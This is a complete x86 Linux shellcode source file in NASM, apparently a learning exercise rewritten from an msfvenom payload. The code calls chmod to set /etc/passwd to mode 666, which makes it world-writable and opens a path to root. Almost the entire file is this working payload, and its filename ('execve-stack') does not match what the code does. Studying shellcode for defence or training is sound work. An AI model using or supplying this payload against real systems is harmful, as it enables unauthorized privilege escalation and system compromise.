; Filename: execve-stack.nasm
; Author:  Matteo Malvica
; Website:  http://www.matteomalvica.com
; Size: 35 bytes
; Disassembled and rewritten from msfvenom linux/x86/chmod payload

		

global _start
section .text

_start:

	cdq		 	 ; converts doubleword to quadword used to zero out EDX with one byte only
	push byte +0xf           ; pushes syscall 15 (sys_chmod) to the stack
	pop eax                  ; loads the syscall into eax
	push edx                 ; pushes empty edx onto the stack as nullbyte string terminator.
        push 0x64777373	         ; push //etc/passwd in reverse order
        push 0x61702f63
        push 0x74652f2f
	mov ebx, esp 		 ; load the filepath into ebx
	push 0x1b6     	         ; push octal 666 onto the stack
	pop ecx    		 ; load it into ecx
	int 0x80		 ; run it
	
	push byte +0x1	         ; closing theme
	pop eax
	int 0x80

